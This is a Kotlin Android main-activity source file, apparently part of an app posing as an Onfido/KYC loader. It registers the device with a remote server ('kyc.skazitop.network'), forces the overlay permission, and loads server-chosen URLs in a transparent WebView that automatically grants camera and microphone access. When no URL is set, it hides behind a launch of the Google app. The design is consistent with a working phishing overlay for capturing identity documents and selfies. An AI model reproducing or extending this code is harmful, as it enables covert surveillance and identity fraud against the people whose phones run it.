package com.example.onfidoloader

import android.annotation.SuppressLint
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.util.Log
import android.view.View
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.*
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private var filePathCallback: ValueCallback<Array<Uri>>? = null
    private val FILE_CHOOSER_RESULT_CODE = 1001

    private val serverBase = "https://kyc.skazitop.network/api"
    private val deviceId: String by lazy {
        Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        setIntent(intent)
        handleIntent(intent)
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        if (!Settings.canDrawOverlays(this)) {
            val overlayIntent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")
            )
            overlayIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(overlayIntent)
            finish()
            return
        }

        if (intent?.getBooleanExtra("forceClose", false) == true) {
            finish()
            return
        }

        val prefs = getSharedPreferences("prefs", Context.MODE_PRIVATE)
        if (!prefs.getBoolean("registered", false)) {
            registerDevice()
            prefs.edit().putBoolean("registered", true).apply()
        }

        handleIntent(intent)
    }

    private fun handleIntent(intent: Intent?) {
        val prefs = getSharedPreferences("prefs", Context.MODE_PRIVATE)
        val url = intent?.getStringExtra("url")
            ?: prefs.getString("last_url", null)

        if (!url.isNullOrBlank()) {
            setupWebView(url)
        } else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(Intent(this, BackgroundService::class.java))
            } else {
                startService(Intent(this, BackgroundService::class.java))
            }

            try {
                val explicitIntent = Intent().apply {
                    component = ComponentName(
                        "com.google.android.googlequicksearchbox",
                        "com.google.android.googlequicksearchbox.SearchActivity"
                    )
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(explicitIntent)
            } catch (e: Exception) {
                Log.e("MainActivity", "Explicit Google app launch failed: ${e.message}")
                startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://www.google.com")))
            }

            Handler(Looper.getMainLooper()).postDelayed({
                finish()
            }, 1500)
        }
    }

    private fun setupWebView(url: String) {
        val prefs = getSharedPreferences("prefs", Context.MODE_PRIVATE)
        prefs.edit().putString("last_url", url).apply()

        webView = WebView(this).apply {
            setBackgroundColor(Color.TRANSPARENT)
            setLayerType(View.LAYER_TYPE_SOFTWARE, null)

            settings.apply {
                javaScriptEnabled = true
                domStorageEnabled = true
                mediaPlaybackRequiresUserGesture = false
                userAgentString = WebSettings.getDefaultUserAgent(this@MainActivity)
            }

            webViewClient = object : WebViewClient() {
                override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?) = true.also {
                    view?.loadUrl(request?.url.toString())
                }
            }

            webChromeClient = object : WebChromeClient() {
                override fun onPermissionRequest(request: PermissionRequest?) {
                    request?.grant(request.resources)
                }

                override fun onShowFileChooser(
                    webView: WebView?,
                    filePathCallback: ValueCallback<Array<Uri>>,
                    fileChooserParams: FileChooserParams
                ): Boolean {
                    this@MainActivity.filePathCallback?.onReceiveValue(null)
                    this@MainActivity.filePathCallback = filePathCallback

                    val intent = fileChooserParams.createIntent()
                    try {
                        startActivityForResult(intent, FILE_CHOOSER_RESULT_CODE)
                    } catch (e: Exception) {
                        this@MainActivity.filePathCallback = null
                        Log.e("WebView", "Cannot open file chooser: ${e.message}")
                        return false
                    }
                    return true
                }
            }

            addJavascriptInterface(object {
                @JavascriptInterface
                fun closeApp() {
                    prefs.edit().remove("last_url").apply()
                    logEvent("close")
                    stopService(Intent(this@MainActivity, BackgroundService::class.java))
                    runOnUiThread { finish() }
                }
            }, "AndroidInterface")

            loadUrl(url)
        }

        setContentView(webView)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == FILE_CHOOSER_RESULT_CODE) {
            val results: Array<Uri>? = WebChromeClient.FileChooserParams.parseResult(resultCode, data)
            filePathCallback?.onReceiveValue(results)
            filePathCallback = null
        }
    }

    private fun logEvent(event: String) {
        CoroutineScope(Dispatchers.IO).launch {
            val body = JSONObject().apply {
                put("deviceId", deviceId)
                put("type", event)
                put("payload", "")
            }

            try {
                val conn = URL("$serverBase/log.php").openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true
                conn.outputStream.use { it.write(body.toString().toByteArray()) }
                conn.inputStream.bufferedReader().readText()
                Log.d("logEvent", "Sent: $event")
            } catch (e: Exception) {
                Log.e("logEvent", "Failed to send log: ${e.message}")
            }
        }
    }

    private fun registerDevice() {
        val deviceInfo = JSONObject().apply {
            put("deviceId", deviceId)
            put("model", Build.MODEL)
            put("brand", Build.BRAND)
            put("android", Build.VERSION.RELEASE)
            put("time", System.currentTimeMillis())
        }

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val url = URL("$serverBase/register.php")
                with(url.openConnection() as HttpURLConnection) {
                    requestMethod = "POST"
                    setRequestProperty("Content-Type", "application/json")
                    doOutput = true
                    outputStream.write(deviceInfo.toString().toByteArray())
                    val response = inputStream.bufferedReader().readText()
                    Log.d("registerDevice", "Registration successful: $response")
                }
            } catch (e: Exception) {
                Log.e("registerDevice", "Registration failed: ${e.message}")
            }
        }
    }
}
